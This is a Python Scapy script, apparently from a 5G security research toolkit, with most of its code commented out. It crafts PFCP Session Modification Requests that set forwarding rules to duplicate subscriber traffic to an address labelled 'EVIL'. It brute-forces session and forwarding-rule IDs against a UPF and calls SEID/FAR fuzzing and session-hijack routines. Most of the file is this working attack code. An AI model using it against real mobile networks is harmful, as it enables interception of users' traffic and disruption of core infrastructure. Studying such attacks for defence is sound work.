from scapy.all import send, sendp, sr1, Ether, IP, UDP, conf
from scapy.contrib.pfcp import *
from pfcpToolkit import PFCPToolkit
import random
from pfcpToolkit import PFCPToolkit
from pfcpFuzzer import PFCPFuzzer
from pfcpHijack import PFCPHijack
from src import ip_list

teid_counter = 1
randomize_teid = False
teid = None

randomize_seq = True
seq = 1


DEST_PORT = 8805
SRC_PORT = 8805
NET_IFACE = "eth0"


# def new_ue_addr(randomize=False):
#     """
#     Generate a completely random IPv4 address.

#     Returns:
#         str: The generated random IPv4 address as a string.
#     """

#     return f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"

# def new_seq(randomize=False):
#     """
#     Generate a new PFCP sequence number.

#     Args:
#         randomize (bool, optional): If True, generates a completely random sequence number.
#             If False, increments sequentially with thread safety. Defaults to False.

#     Returns:
#         int: The generated sequence number.
#     """

#     global randomize_seq, seq

#     if randomize_seq or randomize:
#         seqNbr = random.randint(1, 0xFFFFFFFF)
#         return seqNbr


#     current_seq = seq
#     seq += 1
#     if seq > 0xFFFFFFFF:
#         seq = 1
#     return current_seq


# def new_teid(randomize=False):

#     global teid, teid_counter, randomize_teid

#     if randomize_teid or randomize:
#         teid = random.randint(1, 0xFFFFFFFF)
#         return teid

#     teid = teid_counter
#     teid_counter += 1
#     if teid_counter > 0xFFFFFFFF:
#         teid_counter = 1
#     return teid


# def Build_PFCP_session_modification_req(seid, far_id, src_addr=None, dest_addr=None, src_port=None, dest_port=None, apply_action=["FORW"]):
#     """
#     Build a PFCP Session Modification Request packet.

#     Args:
#         seid (int): Session Endpoint Identifier (SEID) of the session to modify.
#         far_id (int): Forwarding Action Rule (FAR) ID to update.
#         src_addr (str, optional): Source IPv4 address for the PFCP message. Defaults to instance's src_addr.
#         dest_addr (str, optional): Destination IPv4 address (typically the UPF). Defaults to instance's dest_addr.
#         src_port (int, optional): UDP source port for sending the PFCP message. Defaults to instance's src_port.
#         dest_port (int, optional): UDP destination port for the PFCP message. Defaults to instance's dest_port.
#         apply_action (list or str, optional): Actions to apply to the FAR (e.g., ["FORW", "DUPL"]). Defaults to ["FORW"].

#     Returns:
#         scapy.packet.Packet: The constructed PFCP Session Modification Request packet ready for transmission.
#     """
#     src_addr
#     dest_addr
#     src_port
#     dest_port
#     seid


#     # Si une seule action est passée sous forme de string, on la convertit en liste
#     if isinstance(apply_action, str):
#         apply_action = [apply_action]

#     # On prépare dynamiquement le dictionnaire des flags
#     action_flags = {
#         "FORW": 0,
#         "DROP": 0,
#         "BUFF": 0,
#         "NOCP": 0,
#         "DUPL": 0
#     }

#     for action in apply_action:
#         action = action.upper()
#         if action in action_flags:
#             action_flags[action] = 1
#         else:
#             print(f"Unknown apply action: {action}")

#     apply_action_ie = IE_ApplyAction(**action_flags)
#     ie_update_far = None

#     if action_flags["DUPL"] == 1:
#         ie_update_far = IE_UpdateFAR(
#         IE_list=[
#             IE_FAR_Id(id=far_id),
#             apply_action_ie,
#             IE_DuplicatingParameters(
#                 IE_list=[
#                     IE_OuterHeaderCreation(
#                     GTPUUDPIPV4=1,
#                     TEID=new_teid(randomize=True),
#                     ipv4=ip_list["EVIL"],
#                     port=2152
#                     ),

#                 ]
#             )
#             ],


#     )
#     ie_update_far = Raw(bytes(ie_update_far))
#     update_ie = ie_update_far


#     packet = PFCP(
#         version=1,
#         message_type=52,
#         S=1,
#         seid=seid,
#         seq=new_seq(True)
#     ) / update_ie

#     packet = IP(src=src_addr, dst=dest_addr) / UDP(sport=src_port, dport=dest_port) / packet
#     packet = packet.__class__(bytes(packet))
#     return packet


# def Update_FAR(self, far_id, apply_action_ie=IE_ApplyAction(FORW=1)):
#         """
#         Create a raw Update FAR (Forwarding Action Rule) Information Element for PFCP messages.

#         Args:
#             far_id (int): The FAR ID to update within the PFCP session.
#             apply_action_ie (IE_ApplyAction, optional): The Apply Action IE specifying the new behavior. Defaults to IE_ApplyAction(FORW=1).

#         Returns:
#             Raw: Raw bytes representing the Update FAR IE, ready to be included in a PFCP message.
#         """

#         ie_update_far = IE_UpdateFAR(
#         IE_list=[
#             IE_FAR_Id(id=far_id),
#             apply_action_ie
#             ]
#         )
#         ie_update_far = Raw(bytes(ie_update_far))
#         return ie_update_far


# conf.verb = 0
# PFCPToolkit_obj = PFCPToolkit(
#     src_addr=ip_list["EVIL"],
#     dest_addr=ip_list["UPF"],
#     src_port=SRC_PORT,
#     dest_port=DEST_PORT,
#     verbose=True
# )
# for seid in range(1,10):
#     for farid in range(1,100):
#         PFCPToolkit_obj.Send_PFCP_session_modification_req(
#             seid=seid,
#             far_id=farid,
#             src_addr=ip_list["EVIL"],
#             dest_addr=ip_list["UPF"],
#             src_port=SRC_PORT,
#             dest_port=DEST_PORT,
#             apply_action=["FORW", "DUPL"],
#             tdest_addr=ip_list["EVIL"]

#         )

# print ("PFCP Session Modification Request sent")

# PFCPFuzzer_obj = PFCPFuzzer()
# PFCPFuzzer_obj.set_verbose(True)
# ma_liste = PFCPFuzzer_obj.Start_PFCP_SEID_fuzzing(
#     upf_addr=ip_list["UPF"],
#     src_addr=ip_list["EVIL"],
#     max_seid=10,
#     src_port=SRC_PORT,
#     dest_port=DEST_PORT
# )

# print(ma_liste)

# PFCPFuzzer_obj = PFCPFuzzer()
# PFCPFuzzer_obj.set_verbose(True)
# PFCPFuzzer_obj.Start_PFCP_FARID_fuzzing(
#     upf_addr=ip_list["UPF"],
#     src_addr=ip_list["EVIL"],
#     max_seid=10,
#     max_far_discover=100,
#     src_port=SRC_PORT,
#     dest_port=DEST_PORT
# )


# PFCPHijack_obj = PFCPHijack()
# PFCPHijack_obj.set_verbose(True)
# PFCPHijack_obj.Start_PFCP_hijack_far_manipulation(
#     hijacker_addr=ip_list["EVIL"],
#     upf_addr=ip_list["UPF"],
#     src_port=SRC_PORT,
#     dest_port=DEST_PORT,
#     seid=1
# )
